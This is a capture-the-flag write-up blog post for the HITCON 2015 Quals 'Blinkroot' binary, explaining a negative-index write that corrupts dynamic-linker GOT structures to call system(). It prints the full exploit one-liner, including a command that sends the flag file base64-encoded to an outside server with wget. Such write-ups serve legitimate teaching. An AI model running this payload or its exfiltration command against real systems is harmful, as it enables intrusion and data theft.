---
layout: post
title: "HITCON 2015 Quals: Blinkroot"
modified: 2015-10-19
tags: hitcon hitcon2015quals
---
*This challenge was solved by one of my teammates, @kutyacica and me and the write up was written by me.* 

This was a binary which read 1024 bytes from stdin to BSS and indexes into the buffer with the buffer's first 8 bytes as an index and writes to that position `\x10\x00\x00\x00\x00\x00\x00\x00` and the buffer's 8-16 bytes.

As the index is signed, we can use negative numbers and write to address before the buffer. Although we could only use 16-byte aligned addresses.

So we overwrite the GOT loading structures which caused the dl_fixup to overwrite arbitrary memory. As we did not know the address of the system, we also had to make dl_fixup to calculate for us. Fortunately it could be done as it called add instruction on some of our inputs. So we queried the __libc_start_main's address (already in GOT: 0x600B80) and added the difference to main (system-start_main = 0x46640-0x21dd0 = 0x24870).

As the stdin, stdout, stderr was closed, we used a simple wget callback to our server: `http://cuby.hu/x/\$(cat flag|base64)`.

The exploit was:

{% highlight bash %}
while true; do python -c "from pwn import *; bufStart=0x600bd0; where1=p64(0x24870); 
where2='X'*8; what='B'*8; yval=p64(0x600B80-8); y=p64(bufStart+8*8); rdi=p64(bufStart+400); 
payload='\x80'+'\xff'*7 + p64(bufStart) + where1 + rdi + where2 + p64(7) + yval*9 + 
p64(bufStart) + y + p64(0x42)*16 + p64(bufStart+248) + p64(bufStart-8) + p64(bufStart+272) + 
'A'*4 + '\x0a\x03\xFF\xFF' + what + p64(0x43)*13 + 'A'*8 + 
'wget http://cuby.hu/x/\$(cat flag|base64);sleep 10;'; 
print payload+cyclic(1024-len(payload))"|nc 52.68.211.239 10000; sleep 0.1; done
{% endhighlight %}